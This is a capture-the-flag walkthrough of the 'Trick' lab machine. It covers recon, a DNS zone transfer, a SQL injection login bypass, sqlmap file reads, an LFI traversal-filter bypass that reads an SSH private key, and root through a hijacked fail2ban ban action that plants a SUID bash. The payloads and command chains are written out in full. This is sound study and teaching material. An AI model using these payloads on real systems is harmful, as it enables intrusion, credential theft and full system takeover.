Phase 0

Reconnaissance

Nmap

$ sudo nmap -sCV -p- -T4 10.129.28.203
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
25/tcp open  smtp?
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7
80/tcp open  http    nginx 1.14.2

Four ports. SSH, SMTP, DNS, and HTTP. Port 53 (DNS) being open on a non-DNS-server is the most interesting finding — it suggests we might be able to query the target's DNS directly.

DNS Zone Transfer (AXFR)

When a DNS server is exposed, always try a zone transfer first. AXFR dumps every DNS record for a domain — far more effective than brute-forcing subdomains with wordlists.

$ dig axfr trick.htb @10.129.28.203
trick.htb.                604800  IN  SOA   trick.htb. root.trick.htb.
trick.htb.                604800  IN  NS    trick.htb.
trick.htb.                604800  IN  A     127.0.0.1
trick.htb.                604800  IN  AAAA  ::1
preprod-payroll.trick.htb. 604800  IN  CNAME trick.htb.
trick.htb.                604800  IN  SOA   trick.htb. root.trick.htb.
Why AXFR worked Zone transfers are meant for replicating DNS data between authoritative servers. When misconfigured, any client can request one. Unlike vhost brute-forcing (which failed here with multiple wordlists including the 110k list), AXFR reveals every subdomain the server knows about — including ones no wordlist contains.

Found preprod-payroll.trick.htb — add it to /etc/hosts along with trick.htb.

Phase 1

Initial Access — SQLi to File Read to LFI to SSH

SQL Injection on Payroll Login

The login form at http://preprod-payroll.trick.htb/login.php is vulnerable to a simple authentication bypass via SQL injection:

Username: ' OR 1=1-- -
Password: (anything)

This closes the SQL query's string, injects a true condition, and comments out the password check. We're logged in as Administrator to a "Recruitment Management System".

SQLMap — From Login Bypass to File Reader

The real power of this SQLi isn't the login bypass — it's that the database user has FILE privilege, which means we can read arbitrary files on the server through the SQL injection.

First, capture the login request in Burp and save it as req.txt:

POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=max&password=123
# Confirm SQLi and check privileges
$ sqlmap -r req.txt -p username --batch --privileges
[*] FILE privilege confirmed

# Read /etc/passwd
$ sqlmap -r req.txt -p username --batch --file-read=/etc/passwd
michael:x:1001:1001::/home/michael:/bin/bash

# Read nginx configuration — the key pivot
$ sqlmap -r req.txt -p username --batch \
    --file-read=/etc/nginx/sites-enabled/default

Discovering the Second Vhost

The nginx configuration reveals a second virtual host that AXFR didn't show (it wasn't in DNS):

server {
    server_name preprod-marketing.trick.htb;
    root /var/www/market;
    index index.php;
}

server {
    server_name preprod-payroll.trick.htb;
    root /var/www/payroll;
}
Key Pivot The payroll site had no LFI vulnerability. The marketing site does. Without reading the nginx config via SQLi's --file-read, we would never have found preprod-marketing.trick.htb. SQL injection served as the bridge to the next vulnerability.

LFI on Marketing Site

The marketing site's page parameter is vulnerable to Local File Inclusion. A simple ../ traversal is filtered, but the filter only strips one layer — using ....// bypasses it (the inner ../ is removed, leaving the outer ../ intact):

# Read user flag
http://preprod-marketing.trick.htb/index.php?page=
    ....//....//....//....//....//home/michael/user.txt
9c98e6a5da8c0134d5e49c03dedb6194

# Read michael's SSH private key
http://preprod-marketing.trick.htb/index.php?page=
    ....//....//....//....//....//home/michael/.ssh/id_rsa

Save the private key, set permissions, and SSH in:

$ chmod 600 id_rsa
$ ssh -i id_rsa michael@trick.htb
michael@trick:~$
Phase 2

Privilege Escalation — Fail2Ban Config Hijack

Enumeration

michael@trick:~$ sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

michael@trick:~$ id
uid=1001(michael) groups=1001(michael),1002(security)
What is Fail2Ban? Fail2Ban monitors log files for suspicious patterns (like repeated failed SSH logins) and automatically bans the offending IP by updating firewall rules. Its configuration has three components: filters (patterns to detect), actions (what to do when triggered), and jails (connecting filters to actions with parameters like max retries and ban duration). The default SSH action is iptables-multiport.

Michael can restart fail2ban as root, and belongs to the security group. Let's check what that group owns:

michael@trick:~$ ls -la /etc/fail2ban/action.d/
drwxrwx--- 2 root security 4096 ...
-rw-r--r-- 1 root root     ... iptables-multiport.conf
The Attack Vector The action files belong to root, so we can't edit them directly. But the directory is writable by the security group. In Unix, directory write permission lets you rename (mv) and create files within it — even files owned by root. We can mv the original config away, then cp it back. The copy will be owned by michael, making it editable.

Exploitation — Four Steps, Move Fast

The configuration may be periodically reset by a cleanup script, so all four steps need to happen quickly:

# Step 1: Take ownership of the config file via mv+cp
$ cd /etc/fail2ban/action.d
$ mv iptables-multiport.conf .old
$ cp .old iptables-multiport.conf
# File is now owned by michael — editable!

# Step 2: Replace the ban action with a SUID bash payload
$ nano iptables-multiport.conf
# Find the actionban line and change it to:
actionban = cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash

# Step 3: Restart fail2ban to load the modified config
$ sudo /etc/init.d/fail2ban restart

# Step 4: Trigger the ban from the attacker machine
$ nxc ssh trick.htb -u test -p /usr/share/wordlists/rockyou.txt
# Multiple failed logins → fail2ban triggers → our payload runs as root

Or combine steps 1–3 into a single command for speed:

$ cd /etc/fail2ban/action.d && \
  mv iptables-multiport.conf .old && \
  cp .old iptables-multiport.conf && \
  sed -i 's|actionban = .*|actionban = cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash|' \
    iptables-multiport.conf && \
  sudo /etc/init.d/fail2ban restart

Root

After the brute-force triggers enough failed logins, fail2ban runs our actionban as root, creating a SUID bash:

michael@trick:~$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 1168776 ... /tmp/bash

michael@trick:~$ /tmp/bash -p
bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
17ef9347f06dd079934b7c2121015a46
Why -p? The -p flag tells bash to preserve the effective UID set by the SUID bit. Without it, bash drops privileges to the real UID (michael) as a security measure. With -p, it keeps running as root.
Appendix

Key Takeaways

DNS open? AXFR first.

Zone transfers are faster and more complete than subdomain brute-forcing. Try dig axfr domain @target before reaching for wordlists.

SQL injection is more than auth bypass.

With FILE privilege, SQLi becomes an arbitrary file reader via --file-read. This turned a login bypass into reading nginx configs, which revealed a hidden vhost with the actual vulnerability.

Double-encoding bypasses naive filters.

If ../ is stripped once, ....// survives: the inner ../ is removed, leaving ../. Defense requires recursive stripping or allowlist-based path validation.

Directory write ≠ file write, but close enough.

You can't edit a root-owned file in a writable directory, but you can mv it away and cp it back. The copy inherits your ownership. This is fundamental Unix behavior, not a bug.

Speed matters in unstable environments.

Cleanup scripts may reset configs. Chain your commands (&&) or script them. The fail2ban exploit window is narrow.
